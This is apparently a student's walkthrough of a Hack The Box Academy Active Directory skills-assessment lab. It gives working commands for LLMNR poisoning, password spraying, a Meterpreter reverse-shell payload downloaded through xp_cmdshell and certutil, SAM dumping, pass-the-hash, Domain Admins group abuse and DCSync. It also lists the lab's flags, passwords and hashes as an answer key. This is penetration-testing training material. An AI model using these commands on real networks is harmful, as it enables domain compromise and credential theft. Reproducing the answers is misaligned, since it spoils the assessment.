## ID
530

## Module
Active Directory Enumeration & Attacks

## Kind
lab

## Title
Skills Assessment Part II — Full-Scope Internal AD Compromise

## Description
Chain LLMNR poisoning, password spraying, MSSQL credential reuse, SeImpersonatePrivilege escalation via Meterpreter getsystem, ACL abuse (GenericAll on Domain Admins discovered via bloodhound-python), and domain compromise via net rpc + DCSync.

## Tags
responder, password-spraying, acl-abuse, genericall, dcsync, getsystem

## Commands
- sudo responder -I ens224
- hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
- crackmapexec smb <DC_IP> -u '<USER>' -p '<PASS>' --users
- kerbrute passwordspray -d inlanefreight.local --dc <DC_IP> <USERLIST> Welcome1
- smbmap -u '<USER>' -p '<PASS>' -d INLANEFREIGHT.LOCAL -H <DC_IP> -R 'Department Shares'
- mssqlclient.py inlanefreight/<USER>:'<PASS>'@<SQL01_IP>
- evil-winrm -i <TARGET_IP> -u administrator -H <NTLM_HASH>
- bloodhound-python -d <DOMAIN> -u <USER> -p '<PASS>' -ns <DC_IP> -c Acl --zip
- net rpc group addmem "Domain Admins" "<USER>" -U '<DOMAIN>/<USER>%<PASS>' -S <DC_IP>
- secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP>

## What This Section Covers
This skills assessment validates every major AD attack phase from the module in a single chain: initial access via LLMNR/NBT-NS poisoning, credential reuse and password spraying for lateral spread, privilege escalation through SeImpersonatePrivilege, ACL abuse via GenericAll on Domain Admins, and domain compromise via DCSync. The lab forced several pivots from Windows-based tooling (PowerView, Inveigh) to Linux alternatives (bloodhound-python, net rpc) due to AMSI blocking on the target hosts.

## Methodology

### Network Layout
- Pwnbox SSH: ssh htb-student@<PWNBOX_IP> (password: HTB_@cademy_stdnt!)
- 172.16.7.3 → DC01 (Domain Controller)
- 172.16.7.50 → MS01 (Member Server)
- 172.16.7.60 → SQL01 (SQL Server)
- 172.16.7.240 → Parrot attack box (us)

---

### Phase 1 — Foothold via LLMNR Poisoning (Q1 & Q2)

Start Responder on the internal interface and wait for NTLMv2 hashes:

```
sudo responder -I ens224
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt
hashcat -m 5600 ab920_hash /usr/share/wordlists/rockyou.txt
```

Captured AB920's hash, cracked to: weasal

---

### Phase 2 — Map Network & Access MS01 (Q3)

```
fping -asgq 172.16.7.0/23
sudo nmap -v -A -iL hosts.txt
crackmapexec winrm 172.16.7.50 -u 'ab920' -p 'weasal'
evil-winrm -i 172.16.7.50 -u 'ab920' -p 'weasal'
type C:\flag.txt
```

Flag: aud1t_gr0up_m3mbersh1ps!

---

### Phase 3 — Password Spraying (Q4 & Q5)

```
crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee usernames.txt
cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1
```

Hit: BR086 : Welcome1

---

### Phase 4 — Share Enumeration (Q6)

```
smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3
smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares'
smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares' -A web.config
```

web.config contained MSSQL creds: netdb / D@ta_bAse_adm1n!

---

### Phase 5 — SQL01 Privilege Escalation (Q7)

Connected to MSSQL, confirmed SeImpersonatePrivilege. PrintSpoofer/GodPotato were not available for download. Used Meterpreter + getsystem instead.

Terminal 1 — generate payload and serve:
```
cd /home/htb-student/
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1335 -f exe -o shell.exe
python3 -m http.server 8000
```

Terminal 2 — start listener FIRST:
```
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.7.240
set LPORT 1335
run
```

Terminal 3 — MSSQL shell, transfer and execute:
```
python3 /usr/local/bin/mssqlclient.py inlanefreight/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/shell.exe C:\Users\Public\shell.exe"
xp_cmdshell "C:\Users\Public\shell.exe"
```

Back in Terminal 2 — meterpreter session opens:
```
getsystem
shell
type C:\Users\Administrator\Desktop\flag.txt
```

Critical lesson: listener must be running BEFORE shell.exe executes. getsystem only works at the meterpreter> prompt, not msf6> or cmd.exe.

Flag: s3imp3rs0nate_cl@ssic

---

### Phase 6 — Lateral Movement to MS01 (Q8)

From Meterpreter SYSTEM session on SQL01 (exit cmd shell first):
```
exit
load kiwi
lsa_dump_sam
```

Got admin NTLM hash: bdaffbfe64f1fc646a3353be1c2c3c99

Pass-the-hash to MS01:
```
evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
type C:\Users\administrator\Desktop\flag.txt
```

Flag: exc3ss1ve_adm1n_r1ights!

---

### Phase 7 — ACL Enumeration (Q9)

PowerView failed on MS01 due to AMSI — Import-Module appeared to succeed but all cmdlets were silently stripped. Multiple AMSI bypass attempts failed (Bypass-4MSI crashed Evil-WinRM, manual bypasses produced null errors, PSExec shell mangled PowerShell IEX commands).

Solution: bloodhound-python from Parrot with DOMAIN creds (not local admin hash):
```
bloodhound-python -d inlanefreight.local -u ab920 -p 'weasal' -ns 172.16.7.3 -c Acl --zip
unzip -o *.zip
grep -i "GenericAll" *groups.json
```

Found SID S-1-5-21-3327542485-274640656-2609762496-4611 with GenericAll on Domain Admins (-512).

Resolved with rpcclient:
```
rpcclient -U 'ab920%weasal' 172.16.7.3 -c "lookupsids S-1-5-21-3327542485-274640656-2609762496-4611"
```

Answer: CT059

---

### Phase 8 — Get CT059's Password (Q10)

Inveigh also blocked by AMSI on MS01. Responder didn't capture CT059's hash in time. Verified the password directly:
```
crackmapexec smb 172.16.7.3 -u 'CT059' -p 'charlie1'
```

Answer: charlie1

---

### Phase 9 — Domain Compromise (Q11)

CT059 has GenericAll on Domain Admins but no WinRM access to DC01. PowerShell Invoke-Command returned "Access is denied". Enter-PSSession can't nest inside Evil-WinRM.

Solution: net rpc from Parrot (no Windows shell needed):
```
net rpc group addmem "Domain Admins" "CT059" -U 'INLANEFREIGHT/CT059%charlie1' -S 172.16.7.3
net rpc group members "Domain Admins" -U 'INLANEFREIGHT/CT059%charlie1' -S 172.16.7.3
```

No output = success. Verified CT059 in Domain Admins. Connected directly:
```
evil-winrm -i 172.16.7.3 -u CT059 -p 'charlie1'
type C:\Users\administrator\Desktop\flag.txt
```

Flag: acLs_f0r_th3_w1n!

---

### Phase 10 — DCSync (Q12)

```
python3 /usr/local/bin/secretsdump.py inlanefreight.local/CT059:charlie1@172.16.7.3
```

KRBTGT hash: 7eba70412d81c1cd030d72a3e8dbe05f

---

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Foothold account name | AB920 | Responder LLMNR poisoning on ens224 |
| Q2 — Cleartext password | weasal | Hashcat mode 5600 vs rockyou.txt |
| Q3 — Flag on MS01 C:\flag.txt | aud1t_gr0up_m3mbersh1ps! | Evil-WinRM as ab920 |
| Q4 — Password spray username | BR086 | Kerbrute spray with Welcome1 |
| Q5 — That user's password | Welcome1 | Kerbrute output |
| Q6 — MSSQL password from config | D@ta_bAse_adm1n! | web.config in Department Shares via smbmap |
| Q7 — Flag on SQL01 admin desktop | s3imp3rs0nate_cl@ssic | Meterpreter + getsystem (SeImpersonatePrivilege) |
| Q8 — Flag on MS01 admin desktop | exc3ss1ve_adm1n_r1ights! | Pass-the-hash with admin NTLM from kiwi lsa_dump_sam |
| Q9 — GenericAll user account | CT059 | bloodhound-python from Parrot + rpcclient SID lookup |
| Q10 — That user's cracked password | charlie1 | Direct CME verification |
| Q11 — Flag on DC01 admin desktop | acLs_f0r_th3_w1n! | net rpc group addmem from Parrot → Evil-WinRM to DC01 |
| Q12 — KRBTGT NTLM hash | 7eba70412d81c1cd030d72a3e8dbe05f | secretsdump.py DCSync as CT059 |

## Key Takeaways
- When Windows tools fail (AMSI, constrained language mode), always have a Linux alternative ready: bloodhound-python replaces PowerView+BloodHound, net rpc replaces net group /domain, secretsdump replaces mimikatz, psexec.py replaces PsExec.exe.
- Meterpreter's getsystem is a built-in SeImpersonatePrivilege exploit — you don't need PrintSpoofer or any Potato tool if you have a Meterpreter session.
- The listener MUST be running before the payload executes. This is the number one reason reverse shells fail.
- getsystem only works at the meterpreter> prompt. If you're at msf6> you don't have a session yet. If you're at C:\> you're in a cmd shell — type exit to get back to meterpreter.
- Local admin hashes ≠ domain credentials. bloodhound-python and net rpc need domain creds. Evil-WinRM with a local admin hash works for pass-the-hash to individual hosts.
- net rpc from Linux is the cleanest way to modify AD group membership when you can't get a proper PowerShell session on a domain-joined machine.
- Always serve files with python3 -m http.server from the SAME DIRECTORY the files are in. A 404 or tiny file (469 bytes) means wrong directory.

## Gotchas
- AMSI on HTB machines silently kills PowerView — Import-Module succeeds but all functions are gone. Don't waste time with AMSI bypasses; pivot to Linux tools immediately.
- Evil-WinRM's Bypass-4MSI crashes the session on newer Windows builds.
- Enter-PSSession can't nest inside another remote session (Evil-WinRM is already a PSSession).
- Invoke-Command to DC01 requires WinRM access — not all domain users have it. Use net rpc from Linux instead.
- bloodhound-python needs DOMAIN creds, not local admin hashes. Use ab920:weasal or br086:Welcome1.
- When using lsa_dump_sam in Meterpreter, you must exit the cmd shell first (type "exit") to get back to the meterpreter> prompt where kiwi commands work.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[skills-assessment-part1]]
<!-- AUTO-LINKS-END -->
